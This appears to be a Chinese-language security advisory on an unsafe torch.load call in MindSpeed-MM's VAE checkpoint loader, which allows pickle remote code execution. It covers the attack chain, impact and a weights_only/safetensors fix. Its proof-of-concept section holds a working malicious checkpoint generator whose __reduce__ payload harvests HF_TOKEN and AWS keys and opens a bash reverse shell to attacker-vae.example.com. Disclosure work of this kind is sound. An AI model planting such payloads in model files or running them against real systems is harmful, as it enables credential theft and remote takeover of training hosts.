# VULN-DF-MM-DS-11：VAE模型Checkpoint加载torch.load无保护致Pickle RCE

**严重性**: High | **CWE**: CWE-502 | **置信度**: 85/100
**位置**: `mindspeed_mm/models/ae/contextparallel_causalvae.py:521` @ `load_checkpoint`

---

## 1. 漏洞细节

本漏洞位于 VAE（变分自编码器）checkpoint 加载函数 `load_checkpoint` 中，该函数在加载 `.pt` 或 `.pth` 格式的权重文件时使用 `torch.load()` 但未设置 `weights_only=True` 参数，允许 pickle 反序列化执行任意代码。

`ckpt_path` 参数来自用户配置文件 `mm_model.json` 中的 `ae.from_pretrained` 配置项，用户可以指定任意 checkpoint 文件路径。攻击者可以通过构造恶意的 `.pt` 或 `.pth` 文件作为 VAE 预训练权重，诱导用户使用该权重进行训练或推理，从而在 VAE 初始化时执行任意代码。

### 漏洞成因

1. `torch.load(ckpt_path, map_location=lambda storage, loc: storage)` 未设置安全参数
2. `ckpt_path` 参数来自用户配置，完全可控
3. 该函数在 VAE 模型初始化时调用，是模型构建流程的一部分
4. 函数同时也支持 `.safetensors` 格式，但 `.pt/.pth` 格式仍然存在风险

---

## 2. 漏洞代码

**文件**: `mindspeed_mm/models/ae/contextparallel_causalvae.py` (行 516-533)

```python
def load_checkpoint(self, ckpt_path):
    if not os.path.isfile(ckpt_path):
        raise FileNotFoundError(f"Could not find checkpoint at {ckpt_path}")

    if ckpt_path.endswith("pt") or ckpt_path.endswith("pth"):
        ckpt_dict = torch.load(ckpt_path, map_location=lambda storage, loc: storage)  # <-- 漏洞点：无 weights_only 参数
    elif ckpt_path.endswith(".safetensors"):
        ckpt_dict = safetensors.torch.load_file(ckpt_path)  # 安全格式
    else:
        raise ValueError(f"Invalid checkpoint path: {ckpt_path}")

    if "state_dict" in ckpt_dict.keys():
        ckpt_dict = ckpt_dict["state_dict"]

    missing_keys, unexpected_keys = self.load_state_dict(ckpt_dict, strict=False)
    print(f"Missing keys: {missing_keys}")
    print(f"Unexpected keys: {unexpected_keys}")
```

### 模型初始化上下文

```python
def __init__(self, from_pretrained: str = None, ...):
    super().__init__(config=None)
    # ... encoder/decoder 初始化代码 ...
    
    if from_pretrained is not None:
        self.load_checkpoint(from_pretrained)  # 调用漏洞函数
```

### 配置来源

```json
// mm_model.json 示例配置
{
    "ae": {
        "type": "ContextParallelCasualVAE",
        "from_pretrained": "/path/to/vae_weights.pt",  // 用户可控
        "cp_size": 4,
        "hidden_size": 128,
        "z_channels": 4
    }
}
```

### 代码分析

- **行 520-521**: 检查文件扩展名，`.pt` 或 `.pth` 使用不安全的 `torch.load()`
- **行 521**: `torch.load()` 未设置 `weights_only=True` 参数
- **行 522-523**: `.safetensors` 格式使用安全加载方式
- **行 197-198**: VAE 初始化时调用 `load_checkpoint(from_pretrained)`
- **行 66-67**: `from_pretrained` 参数来自模型配置

---

## 3. 完整攻击链路

```
[入口点] mm_model.json 配置文件
↓ 用户配置 ae.from_pretrained
[中间步骤1] ContextParallelCasualVAE.__init__(from_pretrained=恶意路径) @ contextparallel_causalvae.py:64
↓ 初始化 VAE 模型
[中间步骤2] load_checkpoint(from_pretrained) @ contextparallel_causalvae.py:198
↓ 调用 checkpoint 加载函数
[漏洞触发] torch.load(ckpt_path, map_location=...) @ contextparallel_causalvae.py:521
↓ ckpt_path.endswith("pt") or ckpt_path.endswith("pth")
↓ pickle 反序列化执行恶意代码
```

### 攻击链路说明

1. **入口点**: 用户在 `mm_model.json` 中配置 VAE 的 `from_pretrained` 参数
2. **模型初始化**: `ContextParallelCasualVAE.__init__` 被调用
3. **checkpoint 加载**: `load_checkpoint` 加载预训练权重
4. **代码执行**: `torch.load()` 反序列化恶意 checkpoint，执行 payload

---

## 4. 攻击场景

**攻击者画像**: 提供恶意 VAE 权重的第三方、供应链攻击者、内部威胁
**攻击向量**: 通过共享 VAE checkpoint 文件传播恶意 payload
**利用难度**: 低

### 攻击步骤

1. **构造恶意 VAE checkpoint**: 攻击者创建包含恶意 pickle payload 的 `.pt` 文件
2. **伪装为正常权重**: 文件包含部分正常 VAE 权重以维持模型功能
3. **传播恶意文件**: 通过模型仓库、内部存储等方式传播
4. **触发漏洞**: 用户配置恶意 checkpoint 进行训练或推理

---

## 5. 攻击条件

| 条件类型   | 要求                    | 说明                                               |
| ---------- | ----------------------- | -------------------------------------------------- |
| 网络可达性 | 需能访问 checkpoint 文件 | checkpoint 文件需要在可访问的存储位置              |
| 认证要求   | 可能需要存储访问权限    | 取决于 checkpoint 存储的安全配置                   |
| 配置依赖   | mm_model.json 配置      | 用户需要在配置中指定 VAE checkpoint 路径           |
| 环境依赖   | PyTorch 库              | 需要安装 PyTorch 库                                |

---

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                   |
| -------- | ---- | ------------------------------------------------------ |
| 机密性   | 高   | 恶意代码可窃取视频数据、模型权重、环境变量            |
| 完整性   | 高   | 滥意代码可篡改 VAE 状态、植入后门、修改编码结果        |
| 可用性   | 高   | 恶意代码可删除文件、破坏视频生成流程                   |

**影响范围**: 
- 执行 VAE 加载的训练/推理节点
- 使用该 VAE 的所有视频生成任务
- 整个系统安全性

---

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### 构造恶意 VAE checkpoint

```python
# create_malicious_vae_checkpoint.py
import torch
import os
import subprocess

class VAEPayload:
    def __reduce__(self):
        # pickle 反序列化时执行的恶意代码
        code = '''
import os
import subprocess
import socket

# 窃取 GPU 训练环境信息
gpu_info = subprocess.check_output(['nvidia-smi', '--query-gpu=name,memory.total', '--format=csv']).decode()
hostname = os.uname().nodename
user = os.environ.get('USER')
cwd = os.getcwd()

# 写入窃取信息
with open('/tmp/.vae_payload_info', 'w') as f:
    f.write(f"GPU: {gpu_info}\\n")
    f.write(f"Host: {hostname}\\n")
    f.write(f"User: {user}\\n")
    f.write(f"Working Dir: {cwd}\\n")
    for key in ['CUDA_VISIBLE_DEVICES', 'HF_TOKEN', 'AWS_ACCESS_KEY_ID']:
        f.write(f"{key}: {os.environ.get(key, 'N/A')}\\n")

# 建立反向 shell（高级 payload）
try:
    subprocess.Popen([
        '/bin/bash', '-c',
        'bash -i >& /dev/tcp/attacker-vae.example.com/4445 0>&1'
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass
'''
        return (exec, (code,))

# 创建包含 payload 的 VAE state_dict（伪装为正常权重）
malicious_vae_state = {
    'encoder.conv_in.weight': torch.randn(128, 3, 3, 3),
    'encoder.conv_in.bias': torch.randn(128),
    'decoder.conv_out.weight': torch.randn(3, 128, 3, 3),
    'decoder.conv_out.bias': torch.randn(3),
    'state_dict': {
        'encoder.conv_in.weight': torch.randn(128, 3, 3, 3),
        '__payload__': VAEPayload()
    }
}

# 保存恶意 checkpoint（两种格式）
torch.save(malicious_vae_state, 'malicious_vae.pt')
torch.save(malicious_vae_state, 'malicious_vae.pth')
print("Created malicious VAE checkpoints (.pt and .pth)")
```

### 配置恶意 checkpoint

```json
// mm_model.json
{
    "ae": {
        "type": "ContextParallelCasualVAE",
        "from_pretrained": "./malicious_vae.pt",
        "hidden_size": 128,
        "z_channels": 4,
        "hidden_size_mult": [1, 2, 4, 4]
    }
}
```

### 触发漏洞的命令

```bash
# 用户使用恶意配置运行视频生成任务
python train.py --config mm_model.json

# 或运行推理
python inference.py --model-config mm_model.json --input video.mp4
```

**使用说明**: 
1. 构造包含 payload 的 VAE checkpoint
2. 在配置中指向恶意 checkpoint
3. 启动训练或推理，VAE 初始化时触发 payload

**预期结果**: 
- `/tmp/.vae_payload_info` 包含窃取的环境信息
- 反向 shell 尝试连接攻击者服务器

---

## 8. 验证环境搭建

### 基础环境

- 操作系统: Ubuntu 22.04 / CentOS 8
- Python: 3.10+
- PyTorch: 2.0+
- safetensors: 0.4+
- MindSpeed-MM: 当前版本

### 构建步骤

```bash
# 安装依赖
pip install torch safetensors numpy einops

# 创建测试目录
mkdir -p test_vae_checkpoint
```

### 创建测试 payload

```python
# test_vae_payload.py
import torch
import os

class TestVAEPayload:
    def __reduce__(self):
        return (os.system, ('echo "VULN_DS_11_VAE_CHECKPOINT" > /tmp/vuln_ds_11_marker',))

# 构造模拟的 VAE state_dict
vae_state = {
    'encoder.conv_in.weight': torch.randn(128, 3, 3, 3),
    'encoder.conv_in.bias': torch.randn(128),
    'decoder.conv_out.weight': torch.randn(3, 128, 3, 3),
    '__test_payload__': TestVAEPayload()
}

torch.save(vae_state, 'test_vae_checkpoint/malicious_vae.pt')
torch.save(vae_state, 'test_vae_checkpoint/malicious_vae.pth')
print("Test VAE checkpoints created")
```

### 运行配置

```bash
# 创建测试文件
python test_vae_payload.py

# 验证测试标记不存在
ls /tmp/vuln_ds_11_marker  # 应不存在

# 直接测试 torch.load
python -c "
import torch
state = torch.load('test_vae_checkpoint/malicious_vae.pt', map_location=lambda s, l: s)
print('Loaded keys:', list(state.keys())[:3])
"

# 检查标记
cat /tmp/vuln_ds_11_marker
```

### 验证步骤

1. 创建包含测试 payload 的 VAE checkpoint
2. 使用 `torch.load()` 加载该文件
3. 检查 `/tmp/vuln_ds_11_marker` 是否被创建

### 预期结果

- 文件 `/tmp/vuln_ds_11_marker` 存在
- 内容为 "VULN_DS_11_VAE_CHECKPOINT"

---

## 9. 修复建议

### 立即修复

```python
# 安全版本
def load_checkpoint(self, ckpt_path):
    if not os.path.isfile(ckpt_path):
        raise FileNotFoundError(f"Could not find checkpoint at {ckpt_path}")

    if ckpt_path.endswith("pt") or ckpt_path.endswith("pth"):
        # 使用 weights_only=True 安全加载
        try:
            ckpt_dict = torch.load(ckpt_path, map_location=lambda storage, loc: storage, weights_only=True)
        except Exception as e:
            # 如果安全加载失败，记录警告并建议使用 safetensors
            raise RuntimeError(
                f"Could not load checkpoint safely from {ckpt_path}. "
                f"Error: {e}. Consider using .safetensors format instead."
            )
    elif ckpt_path.endswith(".safetensors"):
        ckpt_dict = safetensors.torch.load_file(ckpt_path)
    else:
        raise ValueError(f"Invalid checkpoint path: {ckpt_path}")

    if "state_dict" in ckpt_dict.keys():
        ckpt_dict = ckpt_dict["state_dict"]

    missing_keys, unexpected_keys = self.load_state_dict(ckpt_dict, strict=False)
    print(f"Missing keys: {missing_keys}")
    print(f"Unexpected keys: {unexpected_keys}")
```

### 长期建议

1. **强制使用 safetensors 格式**: 完全禁止 `.pt/.pth` 格式
2. 添加 checkpoint 文件签名验证
3. 实现 checkpoint 内容白名单检查（只允许预期的 VAE 键名）